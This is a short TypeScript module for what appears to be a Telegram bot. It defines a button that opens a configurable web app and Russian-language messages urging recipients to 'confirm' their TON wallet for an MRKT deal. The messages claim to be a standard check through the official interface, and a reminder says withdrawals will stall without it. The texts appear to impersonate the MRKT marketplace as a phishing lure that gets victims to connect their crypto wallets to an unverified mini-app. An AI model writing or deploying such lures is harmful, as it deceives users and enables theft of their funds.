import { config } from "./config.js";

const OPEN_MRKT = "Открыть MRKT";

export function mrktWebAppKeyboard(): {
  inline_keyboard: Array<Array<{ text: string; web_app: { url: string } }>>;
} {
  return {
    inline_keyboard: [[{ text: OPEN_MRKT, web_app: { url: config.miniappUrl } }]],
  };
}

export const introText =
  "Добрый день. По вашей сделке на MRKT нужно подтвердить TON-кошелёк для вывода на баланс биржи.\n\n" +
  "Это стандартная проверка — займёт около минуты. Нажмите кнопку ниже и подключите тот же кошелёк, что используете в @mrkt.";

export const nudgeText =
  "Напоминаем: без подтверждения кошелька вывод с MRKT не завершится. Кнопка «Открыть MRKT» откроет официальный интерфейс верификации.";
